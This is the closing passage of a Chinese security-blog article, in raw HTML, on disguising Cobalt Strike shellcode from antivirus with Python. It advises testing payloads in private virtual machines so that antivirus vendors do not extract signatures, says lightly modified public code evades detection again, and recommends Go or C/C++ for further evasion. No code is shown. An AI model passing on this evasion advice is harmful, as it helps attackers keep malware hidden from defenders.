onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyy2HQoiafhg89tUOSH7nK5bYCkmiccrN70jaIp7gKPW7ktIg6OWMb6ZQYg/640?wx_fmt=png'" style=""  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">由于我们上传了微步云沙箱以及virustotal.com，样本就会被各大杀软厂家拿去分析，提炼出特征码，以及研究防御姿势，所以建议大家测试的时候自己搭虚拟机测试吧，不然你的vps就得换了（ip地址会被标记），而且自己fuzz出来的姿势很快就会被提炼出特征码。那为什么我愿意 show you the code呢？因为就算公开的代码被提取了特征码，自己再改改就不杀了啊，就这么简单。</span></p><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><strong><span style="box-sizing: border-box;font-size:16px;line-height:36px;;font family: arial, helvetica, sans-serif;">0x09 总结</span></strong></h2><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">此种方式的缺点：单文件体积过大，go语言比较小，veil里面有使用go进行免杀的，单文件体积在800kb左右，如果你学过go的语法，建议你利用go语言来免杀，具体操作，你可以在使用veil时，把它生成的go源码拿出来，结合本文所提及或者其他姿势发散你的思维，也能做出很好的效果。当然我首荐：C/C++</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><br  /></p><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">参考文章</span></h2><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">https://payloads.online/archivers/2019-11-10/3</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">https://xz.aliyun.com/t/4191</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">https://www.anquanke.com/post/id/190354</span></p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/25_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="visibility: visible !important;width: 640px !important;"  /></span></p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);text-align: center;"><strong><span style="font-size:15px;line-height:35px;;">推荐阅读：</span></strong></p><p style="white-space: normal;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);text-align: center;"><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><p style="text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247488659&amp;idx=1&amp;sn=d66eedbe66c2b791dc2e6b69244960f6&amp;chksm=ec1f41acdb68c8bab885b390313ec238119b8a194e6c8b714369fbd8f5738b95763caf75da78&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">干货 | Shellcode免杀总结&lt;一&gt;</a><br  /></p><p style="text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247488659&amp;idx=2&amp;sn=401a5c45d7ea7fb1d55eeaf024a0fcd4&amp;chksm=ec1f41acdb68c8ba6aec9962c71514becfea4ef14ea19e67bb2c4488e1e6b8903b5e8060fb84&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">干货 | Shellcode免杀总结&lt;二&gt;</a><br  /></p><p style="text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247488659&amp;idx=3&amp;sn=f60c99696585433590049d782c79bec7&amp;chksm=ec1f41acdb68c8ba47d0a0cc523571566d4462fad237bf4cf433e29844bec0fc595b64f5a1cf&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">干货 | Shellcode免杀总结&lt;三&gt;</a><br  /></p><p style="text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247488534&amp;idx=1&amp;sn=fd37b093e15cbcf82f0b5d408458658d&amp;chksm=ec1f4129db68c83fda99a59dbe4ddc4c827a9ce25b4937b84056c5f164ee75ba96aeaf8f87a2&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">免杀方法大集结</a><br  /></p><p style="text-align: center;"><br  /></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/26_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /></p>
                </div>
</div>
</body>
</html>